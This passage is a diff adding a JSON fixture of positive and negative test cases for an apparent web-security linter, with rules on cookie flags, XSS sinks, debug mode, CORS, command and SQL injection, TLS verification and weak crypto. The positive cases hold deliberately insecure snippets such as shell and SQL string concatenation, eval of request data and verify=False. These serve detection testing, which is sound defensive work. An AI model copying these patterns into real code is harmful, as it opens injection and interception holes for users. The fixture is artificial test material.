@@ -1,0 +1,3531 @@
+{
+ "cases": [
+  {
+   "id": "web001-neg-express-full-flags-multiline",
+   "rule": "SEC-WEB-001",
+   "kind": "negative",
+   "note": "all three flags present on a multi-line res.cookie call",
+   "files": {
+    "app.js": "app.post('/login', (req, res) => {\n  res.cookie('session', token, {\n    httpOnly: true,\n    secure: true,\n    sameSite: 'strict',\n  });\n  res.sendStatus(204);\n});\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web001-neg-nonsession-cookie",
+   "rule": "SEC-WEB-001",
+   "kind": "negative",
+   "note": "UI preference cookie is not a session cookie",
+   "files": {
+    "prefs.js": "res.cookie('theme', 'dark');\nres.cookie('lang', req.query.lang, { maxAge: 900000 });\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web001-neg-comment-and-docstring",
+   "rule": "SEC-WEB-001",
+   "kind": "negative",
+   "note": "pattern only appears in comments and docstrings",
+   "files": {
+    "views.py": "def login(resp):\n    \"\"\"\n    Never do resp.set_cookie('session', sid) without flags.\n    \"\"\"\n    # res.cookie('sessionId', token)\n    return resp\n",
+    "a.js": "// res.cookie('session', token)\n/*\n res.cookie('auth', t)\n*/\nmodule.exports = {};\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web001-neg-flask-secure-config",
+   "rule": "SEC-WEB-001",
+   "kind": "negative",
+   "note": "Flask/Django settings hardening session cookies",
+   "files": {
+    "settings.py": "SESSION_COOKIE_SECURE = True\nSESSION_COOKIE_HTTPONLY = True\nSESSION_COOKIE_SAMESITE = 'Lax'\nCSRF_COOKIE_SECURE = not DEBUG\n",
+    "views.py": "def f(resp, sid):\n    resp.set_cookie(\"session_id\", sid, httponly=True, secure=True, samesite=\"Lax\")\n    return resp\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web001-neg-express-session-hardened",
+   "rule": "SEC-WEB-001",
+   "kind": "negative",
+   "note": "express-session with a fully hardened cookie block",
+   "files": {
+    "server.js": "app.use(session({\n  secret: process.env.SESSION_SECRET,\n  cookie: { secure: true, httpOnly: true, sameSite: 'lax' },\n}));\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web001-neg-js-reads-cookie",
+   "rule": "SEC-WEB-001",
+   "kind": "negative",
+   "note": "JavaScript reading (not writing) a cookie with a session-looking name, non-session writes",
+   "files": {
+    "c.js": "const sid = document.cookie.split(';').find(c => c.includes('session'));\ndocument.cookie = 'theme=dark; path=/';\nif (document.cookie == 'auth') {}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web001-pos-express-bare",
+   "rule": "SEC-WEB-001",
+   "kind": "positive",
+   "note": "express res.cookie session with no options",
+   "files": {
+    "routes/login.js": "router.post('/login', async (req, res) => {\n  const t = await issue(req.body);\n  res.cookie('sessionId', t);\n  res.json({ok: true});\n});\n"
+   },
+   "expect": [
+    [
+     "routes/login.js",
+     3
+    ]
+   ]
+  },
+  {
+   "id": "web001-pos-flask-partial-multiline",
+   "rule": "SEC-WEB-001",
+   "kind": "positive",
+   "note": "Flask set_cookie across lines, only httponly set",
+   "files": {
+    "app.py": "@app.route('/login')\ndef login():\n    resp = make_response('ok')\n    resp.set_cookie(\n        'auth_token',\n        token,\n        httponly=True,\n    )\n    return resp\n"
+   },
+   "expect": [
+    [
+     "app.py",
+     4
+    ]
+   ]
+  },
+  {
+   "id": "web001-pos-django-settings-false",
+   "rule": "SEC-WEB-001",
+   "kind": "positive",
+   "note": "Django settings explicitly disable flags",
+   "files": {
+    "mysite/settings.py": "INSTALLED_APPS = []\nSESSION_COOKIE_SECURE = False\nSESSION_COOKIE_HTTPONLY = False\nSESSION_COOKIE_SAMESITE = None\n"
+   },
+   "expect": [
+    [
+     "mysite/settings.py",
+     2
+    ],
+    [
+     "mysite/settings.py",
+     3
+    ],
+    [
+     "mysite/settings.py",
+     4
+    ]
+   ]
+  },
+  {
+   "id": "web001-pos-express-session-insecure",
+   "rule": "SEC-WEB-001",
+   "kind": "positive",
+   "note": "express-session cookie secure:false",
+   "files": {
+    "src/app.ts": "import session from 'express-session';\napp.use(session({\n  secret: 'k',\n  cookie: { secure: false, httpOnly: false },\n}));\n"
+   },
+   "expect": [
+    [
+     "src/app.ts",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "web001-pos-js-document-cookie",
+   "rule": "SEC-WEB-001",
+   "kind": "positive",
+   "note": "session id written from JS",
+   "files": {
+    "static/app.js": "function save(token) {\n  document.cookie = 'session=' + token + '; path=/';\n}\n"
+   },
+   "expect": [
+    [
+     "static/app.js",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "web001-pos-koa-cookies-set",
+   "rule": "SEC-WEB-001",
+   "kind": "positive",
+   "note": "koa-style ctx.cookies.set via setCookie helper",
+   "files": {
+    "h.js": "reply.setCookie('jwt', tok, { path: '/' });\n"
+   },
+   "expect": [
+    [
+     "h.js",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web002-neg-static-literals",
+   "rule": "SEC-WEB-002",
+   "kind": "negative",
+   "note": "assignment of constant markup / empty string",
+   "files": {
+    "a.js": "el.innerHTML = '<b>Loading</b>';\nel.innerHTML = '';\nel.innerHTML = `<p>static</p>`;\ndocument.write('<script src=\"x.js\"></script>');\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web002-neg-sanitized",
+   "rule": "SEC-WEB-002",
+   "kind": "negative",
+   "note": "DOMPurify / escape applied before sink",
+   "files": {
+    "b.ts": "el.innerHTML = DOMPurify.sanitize(userHtml);\nel.insertAdjacentHTML('beforeend', sanitizeHtml(h));\nconst x = <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(p.html) }} />;\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web002-neg-textcontent-and-reads",
+   "rule": "SEC-WEB-002",
+   "kind": "negative",
+   "note": "textContent writes, innerHTML reads, comparisons",
+   "files": {
+    "c.js": "el.textContent = userInput;\nconst h = el.innerHTML;\nif (el.innerHTML === other) {}\nconsole.log(el.innerHTML == '');\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web002-neg-comments",
+   "rule": "SEC-WEB-002",
+   "kind": "negative",
+   "note": "sinks mentioned in comments / block comments",
+   "files": {
+    "d.js": "// el.innerHTML = userInput;\n/*\n document.write(location.hash)\n*/\n * el.innerHTML = foo\nmodule.exports = 1;\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web002-neg-vue-literal-and-sanitized",
+   "rule": "SEC-WEB-002",
+   "kind": "negative",
+   "note": "v-html with literal / sanitized expression",
+   "files": {
+    "V.vue": "<template>\n  <p v-html=\"'<em>hi</em>'\"></p>\n  <p v-html=\"sanitize(msg)\"></p>\n</template>\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web002-pos-innerhtml-var",
+   "rule": "SEC-WEB-002",
+   "kind": "positive",
+   "note": "innerHTML assigned from variable and +=",
+   "files": {
+    "x.js": "function show(data) {\n  el.innerHTML = data.name;\n  el.innerHTML += '<i>' + data.tail + '</i>';\n}\n"
+   },
+   "expect": [
+    [
+     "x.js",
+     2
+    ],
+    [
+     "x.js",
+     3
+    ]
+   ]
+  },
+  {
+   "id": "web002-pos-react-dangerous",
+   "rule": "SEC-WEB-002",
+   "kind": "positive",
+   "note": "React dangerouslySetInnerHTML with prop",
+   "files": {
+    "C.tsx": "export const C = (p) => <div dangerouslySetInnerHTML={{ __html: p.html }} />;\n"
+   },
+   "expect": [
+    [
+     "C.tsx",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web002-pos-vue-vhtml-and-docwrite",
+   "rule": "SEC-WEB-002",
+   "kind": "positive",
+   "note": "v-html bound to data, document.write of query",
+   "files": {
+    "P.vue": "<template>\n  <div v-html=\"comment.body\"></div>\n</template>\n<script>\ndocument.write('<h1>' + location.search + '</h1>');\n</script>\n"
+   },
+   "expect": [
+    [
+     "P.vue",
+     2
+    ],
+    [
+     "P.vue",
+     5
+    ]
+   ]
+  },
+  {
+   "id": "web002-pos-insertadjacent-multiline-assign",
+   "rule": "SEC-WEB-002",
+   "kind": "positive",
+   "note": "insertAdjacentHTML and an assignment whose value is on the next line",
+   "files": {
+    "y.js": "box.insertAdjacentHTML('beforeend', html);\nbox.innerHTML =\n  userComment;\n"
+   },
+   "expect": [
+    [
+     "y.js",
+     1
+    ],
+    [
+     "y.js",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "web003-neg-debug-false-and-env",
+   "rule": "SEC-WEB-003",
+   "kind": "negative",
+   "note": "debug disabled or derived from environment",
+   "files": {
+    "settings.py": "DEBUG = False\nDEBUG = os.environ.get('DEBUG') == '1'\nDEBUG = bool(int(os.getenv('DEBUG', '0')))\n",
+    "app.py": "app.run(debug=False)\napp.run(host='0.0.0.0', debug=os.getenv('DEBUG') == '1')\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web003-neg-dev-named-files",
+   "rule": "SEC-WEB-003",
+   "kind": "negative",
+   "note": "development-only settings / test files",
+   "files": {
+    "config/settings_dev.py": "DEBUG = True\n",
+    "tests/test_app.py": "app.run(debug=True)\n",
+    "docker-compose.dev.yml": "environment:\n  FLASK_DEBUG: 1\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web003-neg-comments-docstrings",
+   "rule": "SEC-WEB-003",
+   "kind": "negative",
+   "note": "debug text in comments and docstrings",
+   "files": {
+    "a.py": "# DEBUG = True\n\"\"\"\nSet DEBUG = True only locally.\napp.run(debug=True)\n\"\"\"\nX = 1\n",
+    "Dockerfile": "# ENV FLASK_DEBUG=1\nENV NODE_ENV=production\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web003-neg-dev-config-class",
+   "rule": "SEC-WEB-003",
+   "kind": "negative",
+   "note": "config classes explicitly named for development/testing",
+   "files": {
+    "config.py": "class Config:\n    DEBUG = False\n\nclass DevelopmentConfig(Config):\n    DEBUG = True\n\nclass TestingConfig(Config):\n    DEBUG = True\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web003-neg-prod-env-config",
+   "rule": "SEC-WEB-003",
+   "kind": "negative",
+   "note": "production env in deploy configs",
+   "files": {
+    ".env": "NODE_ENV=production\nDEBUG=false\nFLASK_DEBUG=0\n",
+    "app.js": "app.set('env', process.env.NODE_ENV || 'production');\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web003-pos-django-debug",
+   "rule": "SEC-WEB-003",
+   "kind": "positive",
+   "note": "Django settings DEBUG = True",
+   "files": {
+    "mysite/settings.py": "SECRET_KEY = os.environ['K']\nDEBUG = True\nALLOWED_HOSTS = []\n"
+   },
+   "expect": [
+    [
+     "mysite/settings.py",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "web003-pos-flask-run-multiline",
+   "rule": "SEC-WEB-003",
+   "kind": "positive",
+   "note": "app.run with debug=True on its own line, and app.debug assignment",
+   "files": {
+    "server.py": "if __name__ == '__main__':\n    app.run(\n        host='0.0.0.0',\n        port=5000,\n        debug=True,\n    )\n",
+    "other.py": "app.debug = True\n"
+   },
+   "expect": [
+    [
+     "server.py",
+     2
+    ],
+    [
+     "other.py",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web003-pos-env-config",
+   "rule": "SEC-WEB-003",
+   "kind": "positive",
+   "note": "debug flags in .env / Dockerfile / yaml",
+   "files": {
+    ".env": "APP_DEBUG=true\n",
+    "Dockerfile": "FROM node\nENV NODE_ENV=development\n",
+    "config/app.yml": "server:\n  debug: true\n"
+   },
+   "expect": [
+    [
+     ".env",
+     1
+    ],
+    [
+     "Dockerfile",
+     2
+    ],
+    [
+     "config/app.yml",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "web003-pos-express-env-development",
+   "rule": "SEC-WEB-003",
+   "kind": "positive",
+   "note": "Express forced into development",
+   "files": {
+    "srv.js": "const app = express();\napp.set('env', 'development');\n"
+   },
+   "expect": [
+    [
+     "srv.js",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "web004-neg-explicit-origin-credentials",
+   "rule": "SEC-WEB-004",
+   "kind": "negative",
+   "note": "specific origin with credentials",
+   "files": {
+    "a.js": "app.use(cors({ origin: 'https://app.example.com', credentials: true }));\n",
+    "b.py": "CORS(app, origins=['https://app.example.com'], supports_credentials=True)\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web004-neg-wildcard-no-credentials",
+   "rule": "SEC-WEB-004",
+   "kind": "negative",
+   "note": "public API wildcard without credentials",
+   "files": {
+    "c.js": "app.use(cors({ origin: '*' }));\napp.use(cors({ origin: true }));\n",
+    "d.py": "CORS(app, origins='*')\nCORS_ALLOW_ALL_ORIGINS = True\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web004-neg-allowlist-callback",
+   "rule": "SEC-WEB-004",
+   "kind": "negative",
+   "note": "origin callback only approves allowlisted origins",
+   "files": {
+    "e.js": "app.use(cors({\n  origin: (origin, cb) => allowedOrigins.includes(origin) ? cb(null, true) : cb(new Error('no')),\n  credentials: true,\n}));\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web004-neg-reflect-with-allowlist",
+   "rule": "SEC-WEB-004",
+   "kind": "negative",
+   "note": "reflected ACAO header guarded by an allowlist",
+   "files": {
+    "f.js": "const ALLOWED = new Set(['https://a.com']);\nres.setHeader('Access-Control-Allow-Credentials', 'true');\nif (ALLOWED.has(req.headers.origin)) {\n  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);\n}\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web004-neg-comments",
+   "rule": "SEC-WEB-004",
+   "kind": "negative",
+   "note": "insecure CORS only in comments",
+   "files": {
+    "g.js": "// app.use(cors({ origin: '*', credentials: true }));\napp.use(cors({ origin: 'https://x.io', credentials: true }));\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web004-pos-express-wildcard-credentials",
+   "rule": "SEC-WEB-004",
+   "kind": "positive",
+   "note": "express cors wildcard + credentials, multi-line",
+   "files": {
+    "s.js": "app.use(cors({\n  origin: '*',\n  credentials: true,\n}));\n"
+   },
+   "expect": [
+    [
+     "s.js",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web004-pos-flask-cors",
+   "rule": "SEC-WEB-004",
+   "kind": "positive",
+   "note": "flask-cors wildcard with supports_credentials",
+   "files": {
+    "app.py": "CORS(app, resources={r\"/api/*\": {\"origins\": \"*\"}}, supports_credentials=True)\n"
+   },
+   "expect": [
+    [
+     "app.py",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web004-pos-django-all-origins",
+   "rule": "SEC-WEB-004",
+   "kind": "positive",
+   "note": "django-cors-headers allow all + credentials",
+   "files": {
+    "settings.py": "CORS_ALLOW_ALL_ORIGINS = True\nCORS_ALLOW_CREDENTIALS = True\n"
+   },
+   "expect": [
+    [
+     "settings.py",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web004-pos-reflected-header",
+   "rule": "SEC-WEB-004",
+   "kind": "positive",
+   "note": "manually reflected origin with credentials, no allowlist",
+   "files": {
+    "mw.js": "app.use((req, res, next) => {\n  res.setHeader('Access-Control-Allow-Credentials', 'true');\n  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);\n  next();\n});\n"
+   },
+   "expect": [
+    [
+     "mw.js",
+     3
+    ]
+   ]
+  },
+  {
+   "id": "web004-pos-callback-always-true",
+   "rule": "SEC-WEB-004",
+   "kind": "positive",
+   "note": "origin callback that approves everything",
+   "files": {
+    "c.js": "app.use(cors({ origin: function (o, callback) { callback(null, true); }, credentials: true }));\n"
+   },
+   "expect": [
+    [
+     "c.js",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web005-neg-literal-eval-and-methods",
+   "rule": "SEC-WEB-005",
+   "kind": "negative",
+   "note": "literal arguments, .exec/.eval methods, literal_eval",
+   "files": {
+    "a.py": "import ast\nx = ast.literal_eval(s)\nmodel.eval()\nres = pattern.exec(text)\neval('1+1')\n",
+    "b.js": "const m = /a(b)/.exec(str);\nconst r = db.exec('SELECT 1');\nvm.eval('1');\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web005-neg-subprocess-list-args",
+   "rule": "SEC-WEB-005",
+   "kind": "negative",
+   "note": "argument vector, no shell",
+   "files": {
+    "c.py": "subprocess.run(['git', 'clone', url, dest], check=True)\nsubprocess.run(f'ls {d}', shell=False)\nsubprocess.check_output([sys.executable, '-c', 'pass'])\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web005-neg-static-shell-command",
+   "rule": "SEC-WEB-005",
+   "kind": "negative",
+   "note": "shell=True / os.system on fixed strings",
+   "files": {
+    "d.py": "os.system('clear')\nsubprocess.run('make build', shell=True)\n",
+    "e.js": "exec('git status', cb);\nexecSync(`ls -la`);\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web005-neg-comments-docstrings",
+   "rule": "SEC-WEB-005",
+   "kind": "negative",
+   "note": "dangerous calls only mentioned in comments / docstrings",
+   "files": {
+    "f.py": "# os.system('rm ' + path)\n\"\"\"\nexample: eval(user_input)\n\"\"\"\nx = 1\n",
+    "g.js": "// eval(req.body.code)\n/* new Function('return ' + x) */\nconst y = 2;\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web005-neg-execfile-safe-js",
+   "rule": "SEC-WEB-005",
+   "kind": "negative",
+   "note": "execFile with argv array",
+   "files": {
+    "h.js": "execFile('convert', [input, output], cb);\nspawn('ls', ['-l', dir]);\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web005-pos-os-system-concat",
+   "rule": "SEC-WEB-005",
+   "kind": "positive",
+   "note": "os.system with concatenation / f-string / popen format",
+   "files": {
+    "a.py": "os.system('ping -c 1 ' + host)\nos.popen(f'nslookup {name}')\nos.system('tar xf %s' % path)\n"
+   },
+   "expect": [
+    [
+     "a.py",
+     1
+    ],
+    [
+     "a.py",
+     2
+    ],
+    [
+     "a.py",
+     3
+    ]
+   ]
+  },
+  {
+   "id": "web005-pos-subprocess-shell-true",
+   "rule": "SEC-WEB-005",
+   "kind": "positive",
+   "note": "subprocess shell=True with interpolated command, multi-line",
+   "files": {
+    "b.py": "out = subprocess.check_output(\n    f'grep {term} /var/log/app.log',\n    shell=True,\n)\n"
+   },
+   "expect": [
+    [
+     "b.py",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web005-pos-js-exec-template",
+   "rule": "SEC-WEB-005",
+   "kind": "positive",
+   "note": "child_process.exec with template literal / concat",
+   "files": {
+    "c.js": "const cp = require('child_process');\ncp.exec(`ping ${req.query.host}`, cb);\nexec('convert ' + file + ' out.png', cb);\n"
+   },
+   "expect": [
+    [
+     "c.js",
+     2
+    ],
+    [
+     "c.js",
+     3
+    ]
+   ]
+  },
+  {
+   "id": "web005-pos-eval-request",
+   "rule": "SEC-WEB-005",
+   "kind": "positive",
+   "note": "eval of request data in JS and Python, new Function",
+   "files": {
+    "d.js": "const r = eval(req.body.expr);\nconst f = new Function('a', 'return ' + code);\n",
+    "e.py": "v = eval(request.args['expr'])\n"
+   },
+   "expect": [
+    [
+     "d.js",
+     1
+    ],
+    [
+     "d.js",
+     2
+    ],
+    [
+     "e.py",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web006-neg-parameterized",
+   "rule": "SEC-WEB-006",
+   "kind": "negative",
+   "note": "placeholders with bound parameters",
+   "files": {
+    "a.py": "cur.execute(\"SELECT * FROM users WHERE id = %s\", (uid,))\ncur.execute('DELETE FROM t WHERE a = ? AND b = ?', (a, b))\n",
+    "b.js": "db.query('SELECT id, name FROM users WHERE email = $1', [email]);\n",
+    "c.java": "ps = c.prepareStatement(\"UPDATE users SET name = ? WHERE id = ?\");\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web006-neg-ui-text-select-from",
+   "rule": "SEC-WEB-006",
+   "kind": "negative",
+   "note": "English UI text that starts with 'Select ... from'",
+   "files": {
+    "d.py": "msg = f\"Select an item from {menu}\"\nlabel = \"Select all items from the list \" + name\nprint('Update the profile set by {}'.format(x))\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web006-neg-constant-sql-and-comments",
+   "rule": "SEC-WEB-006",
+   "kind": "negative",
+   "note": "static SQL and commented concatenation",
+   "files": {
+    "e.py": "Q = 'SELECT id, email FROM users WHERE active = 1'\n# q = 'SELECT * FROM t WHERE id=' + id\n\"\"\"\nq = f\"SELECT * FROM t WHERE id={x}\"\n\"\"\"\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web006-neg-orm-and-named-params",
+   "rule": "SEC-WEB-006",
+   "kind": "negative",
+   "note": "ORM query builders and SQLAlchemy text() with bind names",
+   "files": {
+    "f.py": "rows = session.execute(text('SELECT * FROM users WHERE id = :id'), {'id': uid})\nq = User.query.filter_by(id=uid).first()\n",
+    "g.js": "knex('users').where({ id }).select('*');\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web006-neg-prose-delete-update",
+   "rule": "SEC-WEB-006",
+   "kind": "negative",
+   "note": "messages mentioning DELETE/UPDATE keywords as prose",
+   "files": {
+    "h.js": "log.info(`Cache update for ${key} complete`);\nthrow new Error('Delete from ' + where + ' failed');\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web006-pos-py-fstring-and-percent",
+   "rule": "SEC-WEB-006",
+   "kind": "positive",
+   "note": "f-string and % formatting",
+   "files": {
+    "a.py": "cur.execute(f\"SELECT * FROM users WHERE name = '{name}'\")\ncur.execute(\"DELETE FROM t WHERE id = %s\" % tid)\n"
+   },
+   "expect": [
+    [
+     "a.py",
+     1
+    ],
+    [
+     "a.py",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "web006-pos-js-template-and-concat",
+   "rule": "SEC-WEB-006",
+   "kind": "positive",
+   "note": "JS template literal and concatenation",
+   "files": {
+    "b.js": "db.query(`SELECT * FROM orders WHERE user = ${req.user.id}`);\ndb.query(\"UPDATE users SET name='\" + name + \"' WHERE id=\" + id);\n"
+   },
+   "expect": [
+    [
+     "b.js",
+     1
+    ],
+    [
+     "b.js",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "web006-pos-java-concat-multiline",
+   "rule": "SEC-WEB-006",
+   "kind": "positive",
+   "note": "Java string concatenation continued over lines",
+   "files": {
+    "Dao.java": "String q = \"SELECT id, name FROM users WHERE name = '\" +\n    name + \"'\";\nstmt.executeQuery(q);\n"
+   },
+   "expect": [
+    [
+     "Dao.java",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web006-pos-php-interpolation",
+   "rule": "SEC-WEB-006",
+   "kind": "positive",
+   "note": "PHP variable concatenated into SQL",
+   "files": {
+    "u.php": "$r = mysqli_query($c, \"SELECT * FROM users WHERE id = \" . $_GET['id']);\n"
+   },
+   "expect": [
+    [
+     "u.php",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web006-pos-insert-format",
+   "rule": "SEC-WEB-006",
+   "kind": "positive",
+   "note": "INSERT built with str.format",
+   "files": {
+    "i.py": "q = \"INSERT INTO logs (msg) VALUES ('{}')\".format(msg)\n"
+   },
+   "expect": [
+    [
+     "i.py",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web007-neg-verify-enabled",
+   "rule": "SEC-WEB-007",
+   "kind": "negative",
+   "note": "verification on or custom CA bundle",
+   "files": {
+    "a.py": "requests.get(url, verify=True)\nrequests.get(url, verify='/etc/ssl/ca.pem')\nctx.check_hostname = True\n",
+    "b.js": "https.request({ rejectUnauthorized: true });\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web007-neg-conditional-cert-required",
+   "rule": "SEC-WEB-007",
+   "kind": "negative",
+   "note": "CERT_REQUIRED default with opt-out ternary",
+   "files": {
+    "c.py": "ctx.verify_mode = ssl.CERT_REQUIRED if strict else ssl.CERT_NONE\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web007-neg-comments",
+   "rule": "SEC-WEB-007",
+   "kind": "negative",
+   "note": "disabled-verification text in comments and docstring",
+   "files": {
+    "d.py": "# requests.get(u, verify=False)\n\"\"\"\nDo not use verify=False\n\"\"\"\nx = 1\n",
+    "e.js": "// rejectUnauthorized: false\n",
+    "f.sh": "# curl -k https://x\ncurl --cacert ca.pem https://x\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web007-neg-test-code",
+   "rule": "SEC-WEB-007",
+   "kind": "negative",
+   "note": "test and mock helpers may disable verification",
+   "files": {
+    "tests/test_client.py": "def test_it():\n    requests.get(URL, verify=False)\n",
+    "src/conftest.py": "ctx = ssl._create_unverified_context()\n",
+    "e2e/helper.js": "const agent = new https.Agent({ rejectUnauthorized: false });\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web007-neg-lookalike-names",
+   "rule": "SEC-WEB-007",
+   "kind": "negative",
+   "note": "names that resemble the flag but are not it",
+   "files": {
+    "g.py": "ssl_verify = False\nparser.add_argument('--insecure', action='store_true')\nverify_email = False\nself.verified = False\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web007-pos-requests-verify-false",
+   "rule": "SEC-WEB-007",
+   "kind": "positive",
+   "note": "requests verify=False incl. multi-line",
+   "files": {
+    "a.py": "r = requests.get(\n    url,\n    verify=False,\n)\nrequests.post(u, verify = False)\n"
+   },
+   "expect": [
+    [
+     "a.py",
+     3
+    ],
+    [
+     "a.py",
+     5
+    ]
+   ]
+  },
+  {
+   "id": "web007-pos-node-reject-unauthorized",
+   "rule": "SEC-WEB-007",
+   "kind": "positive",
+   "note": "node TLS disabled three ways",
+   "files": {
+    "b.js": "const agent = new https.Agent({ rejectUnauthorized: false });\nprocess.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';\nrequest({ url, strictSSL: false });\n"
+   },
+   "expect": [
+    [
+     "b.js",
+     1
+    ],
+    [
+     "b.js",
+     2
+    ],
+    [
+     "b.js",
+     3
+    ]
+   ]
+  },
+  {
+   "id": "web007-pos-go-and-ssl-module",
+   "rule": "SEC-WEB-007",
+   "kind": "positive",
+   "note": "Go InsecureSkipVerify and python ssl unverified context",
+   "files": {
+    "c.go": "tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}\n",
+    "d.py": "ssl._create_default_https_context = ssl._create_unverified_context\nctx.check_hostname = False\nctx.verify_mode = ssl.CERT_NONE\n"
+   },
+   "expect": [
+    [
+     "c.go",
+     1
+    ],
+    [
+     "d.py",
+     1
+    ],
+    [
+     "d.py",
+     2
+    ],
+    [
+     "d.py",
+     3
+    ]
+   ]
+  },
+  {
+   "id": "web007-pos-curl-insecure",
+   "rule": "SEC-WEB-007",
+   "kind": "positive",
+   "note": "curl -k in deploy script and Dockerfile",
+   "files": {
+    "deploy.sh": "curl -sSf -k https://internal/health\n",
+    "Dockerfile": "RUN curl --insecure -o /x https://host/x\n"
+   },
+   "expect": [
+    [
+     "deploy.sh",
+     1
+    ],
+    [
+     "Dockerfile",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web008-neg-checksum-md5-sha1",
+   "rule": "SEC-WEB-008",
+   "kind": "negative",
+   "note": "md5/sha1 as file checksum / etag",
+   "files": {
+    "a.py": "etag = hashlib.md5(body).hexdigest()\nsha = hashlib.sha1(chunk).hexdigest()\ndigest = hashlib.md5(data, usedforsecurity=False)  # password cache key\n",
+    "b.js": "const h = crypto.createHash('md5').update(buf).digest('hex');\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web008-neg-nonsecurity-random",
+   "rule": "SEC-WEB-008",
+   "kind": "negative",
+   "note": "Math.random / random for jitter, shuffling and UI",
+   "files": {
+    "c.js": "const jitter = Math.random() * retryDelay;\nconst color = palette[Math.floor(Math.random() * palette.length)];\nsessionStorage.setItem('seen', String(Math.random() > 0.5));\n",
+    "d.py": "author = random.choice(authors)\nrandom.shuffle(deck)\nx = random.randint(1, 6)\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web008-neg-secure-primitives",
+   "rule": "SEC-WEB-008",
+   "kind": "negative",
+   "note": "CSPRNG and strong hashes",
+   "files": {
+    "e.py": "token = secrets.token_urlsafe(32)\nh = hashlib.sha256(password.encode()).hexdigest()\npw = bcrypt.hashpw(password, bcrypt.gensalt())\n",
+    "f.js": "const token = crypto.randomBytes(32).toString('hex');\nconst nonce = crypto.randomUUID();\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web008-neg-comments",
+   "rule": "SEC-WEB-008",
+   "kind": "negative",
+   "note": "weak primitives only mentioned in comments / docstrings",
+   "files": {
+    "g.py": "# token = random.random()\n\"\"\"\npassword_hash = hashlib.md5(password)\n\"\"\"\nx = 1\n",
+    "h.js": "// const token = Math.random().toString(36)\nconst y = 1;\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web008-neg-hash-far-from-password-word",
+   "rule": "SEC-WEB-008",
+   "kind": "negative",
+   "note": "md5 of a file with the word password only far away",
+   "files": {
+    "i.py": "def fingerprint(blob):\n    return hashlib.md5(blob).hexdigest()\n\n\n\ndef set_password(pw):\n    return bcrypt.hashpw(pw)\n"
+   },
+   "expect": []
+  },
+  {
+   "id": "web008-pos-md5-password",
+   "rule": "SEC-WEB-008",
+   "kind": "positive",
+   "note": "md5/sha1 for passwords in py and node",
+   "files": {
+    "a.py": "def hash_pw(password):\n    return hashlib.md5(password.encode()).hexdigest()\n",
+    "b.js": "const h = crypto.createHash('sha1')\n  .update(password)\n  .digest('hex');\n"
+   },
+   "expect": [
+    [
+     "a.py",
+     2
+    ],
+    [
+     "b.js",
+     1
+    ]
+   ]
+  },
+  {
+   "id": "web008-pos-math-random-token",
+   "rule": "SEC-WEB-008",
+   "kind": "positive",
+   "note": "Math.random for token / api key",
+   "files": {
+    "c.js": "const resetToken = Math.random().toString(36).slice(2);\nconst apiKey = 'k_' + Math.random();\n"
+   },
+   "expect": [
+    [
+     "c.js",
+     1
+    ],
+    [
+     "c.js",
+     2
+    ]
+   ]
+  },
+  {
+   "id": "web008-pos-python-random-otp-password",
+   "rule": "SEC-WEB-008",
+   "kind": "positive",
